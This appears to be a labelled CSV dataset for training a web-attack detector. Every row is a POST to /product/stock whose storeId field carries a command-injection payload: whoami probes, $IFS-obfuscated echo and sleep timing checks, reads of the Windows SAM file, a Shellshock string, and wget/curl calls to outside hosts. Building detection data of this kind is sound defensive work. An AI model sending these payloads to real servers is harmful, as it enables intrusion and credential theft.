method,path,body,dashes,andsign,dolar,orsign,lessthan,greaterthan,exclamation,badwords,class
POST,/product/stock,productId=2&storeId=1 ;echo XJTEZA$((75+98))$(echo XJTEZA)XJTEZA|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '
echo WIRUWF$((87+88))$(echo WIRUWF)WIRUWF//",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""echo KWRCTG$((97+95))$(echo KWRCTG)KWRCTG//",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '||echo$IFSSWPMAE$((92+33))$(echo$IFSSWPMAE)SWPMAE\\,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo TLXEJK); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 
echo$IFSAPAMDC$((36+45))$(echo$IFSAPAMDC)APAMDC'",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSDPGMPX$((72+63))$(echo$IFSDPGMPX)DPGMPX',0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '||echo$IFSNWOOGT$((48+45))$(echo$IFSNWOOGT)NWOOGT&,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "" echo WFBQGI$((90+90))$(echo WFBQGI)WFBQGI""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo$IFSRVNRNT$((25+8))$(echo$IFSRVNRNT)RVNRNT""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "");}print(`echo RXUKTF\necho $((42+2))\necho RXUKTF\necho RXUKTF`);.%252527RXUKTF",0,0,1,0,0,0,0,8,bad
POST,/product/stock,"productId=2&storeId=1 
echo$IFSUEAGEW$((73+31))$(echo$IFSUEAGEW)UEAGEW",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ; type %SYSTEMROOT%\repair\SAM,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSGUUNMQ$((78+22))$(echo$IFSGUUNMQ)GUUNMQ|,0,0,4,3,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSPNPVKS$((7+36))$(echo$IFSPNPVKS)PNPVKS,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '| [ 1 -ne $(echo YGAAWQ | tr -d '\n' | wc -c) ] || sleep 1 """,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo ZSBSMD$((90+5))$(echo ZSBSMD)ZSBSMD//,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo IYHUSO) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 |,0,4,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "";echo JHIVSM$((44+64))$(echo JHIVSM)JHIVSM//",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo CZQCUH$((88+14))$(echo CZQCUH)CZQCUH&,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 4 -ne $(echo JTXVKL | tr -d '\n' | wc -c) ] || sleep 1,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo LBFVNS) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 #,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 &echo QLFUON$((35+62))$(echo QLFUON)QLFUON""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & system('curl https://crowdshield.com/.testing/rce_vuln.txt');,0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo DFNHJP$((83+52))$(echo DFNHJP)DFNHJP',0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo QVGNVW$((11+26))$(echo QVGNVW)QVGNVW\\,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo FNCMMT$((70+94))$(echo FNCMMT)FNCMMT|",0,1,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "" echo BWDHGF$((47+6))$(echo BWDHGF)BWDHGF""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo YPGEMK$((56+16))$(echo YPGEMK)YPGEMK""",0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 9 -ne $(echo MNLBVU | tr -d '\n' | wc -c) ] || sleep 1 |",0,0,1,6,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 exec('pwd');,0,0,0,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 {% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",0,0,0,0,0,0,0,0,bad
POST,/product/stock,"productId=2&storeId=1 &&echo QCERHI$((79+52))$(echo QCERHI)QCERHI""",0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSXOUJEA$((42+77))$(echo$IFSXOUJEA)XOUJEA',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSCOIZAX$((91+92))$(echo$IFSCOIZAX)COIZAX,0,1,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo YRTLHO$((69+19))$(echo YRTLHO)YRTLHO//",0,1,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 & perl -e 'print ""X""x4096'",0,0,0,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "")print(`echo HXHMHH;echo $((40+31));echo HXHMHH;echo HXHMHH`);//HXHMHH",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSGFEHZK$((68+85))$(echo$IFSGFEHZK)GFEHZK",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '| [ 6 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo GZNGDE) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 &,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSLWIDNI$((59+10))$(echo$IFSLWIDNI)LWIDNI',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSRAALVW$((18+87))$(echo$IFSRAALVW)RAALVW&,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo ELOSZQ$((77+50))$(echo ELOSZQ)ELOSZQ|,0,1,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 );}print(`echo BCMROJ;echo $((2+69));echo BCMROJ;echo BCMROJ`);.%27BCMROJ,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo OKKNHF); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,0,0,3,1,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo$IFSONWUBF$((85+46))$(echo$IFSONWUBF)ONWUBF\\",0,0,4,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo XTNGGL$((91+22))$(echo XTNGGL)XTNGGL|",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ||echo$IFSZVZDHM$((59+26))$(echo$IFSZVZDHM)ZVZDHM""",0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | type %SYSTEMROOT%\repair\SAM,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "")print(`echo GIKPYM\necho $((77+22))\necho GIKPYM\necho GIKPYM`);.%252527GIKPYM",0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 ; ls -l /var/www/*,0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1  echo MIBJNK$((69+50))$(echo MIBJNK)MIBJNK\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSASNAHP$((25+52))$(echo$IFSASNAHP)ASNAHP//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1  echo ZDHFWD$((74+46))$(echo ZDHFWD)ZDHFWD//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ';echo NUCRTG$((61+63))$(echo NUCRTG)NUCRTG',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSFWBTCO$((35+92))$(echo$IFSFWBTCO)FWBTCO|,0,0,4,3,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1  echo BSYIFX$((64+71))$(echo BSYIFX)BSYIFX//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ' echo HYHGIN$((59+21))$(echo HYHGIN)HYHGIN|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ' echo VJRMHC$((3+22))$(echo VJRMHC)VJRMHC""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '|echo$IFSYCCUIZ$((60+63))$(echo$IFSYCCUIZ)YCCUIZ""",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '|echo RBWMSW$((98+45))$(echo RBWMSW)RBWMSW""",0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo TLXEJK); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSUTEXYG$((37+68))$(echo$IFSUTEXYG)UTEXYG&,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo OLJBSU); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '| [ 5 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo$IFSUTEHBK$((73+4))$(echo$IFSUTEHBK)UTEHBK|",0,1,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo$IFSTCCUHM$((72+61))$(echo$IFSTCCUHM)TCCUHM//",0,0,4,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo ZDEMVI) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 //",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo BJMMJX) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 \\,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo LYAPEI$((34+37))$(echo LYAPEI)LYAPEI""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo IRODNG$((26+68))$(echo IRODNG)IRODNG,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSEYORRP$((46+13))$(echo$IFSEYORRP)EYORRP,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&echo$IFSCAIGIC$((51+44))$(echo$IFSCAIGIC)CAIGIC&,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&echo$IFSLVUBOX$((6+49))$(echo$IFSLVUBOX)LVUBOX&,0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 | [ 8 -ne $(echo MRDZPJ | tr -d '\n' | wc -c) ] || sleep 1 """,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSNXMKIN$((19+24))$(echo$IFSNXMKIN)NXMKIN|,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo ENIIMV) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 #",0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 "")print(`echo PHKGWS\necho $((9+71))\necho PHKGWS\necho PHKGWS`);PHKGWS",0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo TUAKKW$((59+81))$(echo TUAKKW)TUAKKW&,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '.print(`echo KHHFWC;echo $((15+27));echo KHHFWC;echo KHHFWC`);KHHFWC,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo VGHMVB); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ${proc_open(print(`echo KZLOGK`.`echo $((4+23))`.`echo KZLOGK`.`echo KZLOGK`);.""KZLOGK",0,0,2,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSGPDOCC$((56+25))$(echo$IFSGPDOCC)GPDOCC\,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo FXPFKU) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 %26,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ||echo XVNYDY$((93+18))$(echo XVNYDY)XVNYDY//,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 7 -ne $(echo TYMEOG | tr -d '\n' | wc -c) ] || sleep 1 //,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo VGHMVB); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo HKGDXH)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ';echo$IFSMGMRMA$((41+1))$(echo$IFSMGMRMA)MGMRMA""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | wget http://crowdshield.com/.testing/rce.txt,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSNIEFDN$((50+18))$(echo$IFSNIEFDN)NIEFDN&,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSKZQOKA$((45+18))$(echo$IFSKZQOKA)KZQOKA,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSREQHRF$((82+40))$(echo$IFSREQHRF)REQHRF|,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 sysinfo,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&&echo FBQVWJ$((2+58))$(echo FBQVWJ)FBQVWJ\\,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '&echo SQFUZG$((87+17))$(echo SQFUZG)SQFUZG""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""echo$IFSZTLCXA$((92+39))$(echo$IFSZTLCXA)ZTLCXA\\",0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "")print(`echo CAQHUJ;echo $((70+24));echo CAQHUJ;echo CAQHUJ`);.%27CAQHUJ",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo KWAWXC$((47+31))$(echo KWAWXC)KWAWXC&",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSTGFHRF$((49+19))$(echo$IFSTGFHRF)TGFHRF//,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSRIODOR$((41+80))$(echo$IFSRIODOR)RIODOR|,0,1,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo UOMPHD); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo FEBSKN$((28+4))$(echo FEBSKN)FEBSKN\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo NWAYIZ) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 \\",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSCDNNJT$((44+92))$(echo$IFSCDNNJT)CDNNJT\\,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '| [ 9 -ne $(echo QPTCDE | tr -d '\n' | wc -c) ] || sleep 1 %27,0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '& sleep 0 && str=$(echo DPWDWF) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 """,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo VGMMDM$((58+64))$(echo VGMMDM)VGMMDM""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 a|id,0,0,0,1,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 8 -ne $(echo YPWXZB | tr -d '\n' | wc -c) ] || sleep 1 \\",0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '| [ 2 -ne $(echo JTXVKL | tr -d '\n' | wc -c) ] || sleep 1,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 $(`wget https://crowdshield.com/.testing/rce_vuln.txt`),0,0,1,0,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 () { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo PGAQQT); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSKLSCLG$((90+83))$(echo$IFSKLSCLG)KLSCLG,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
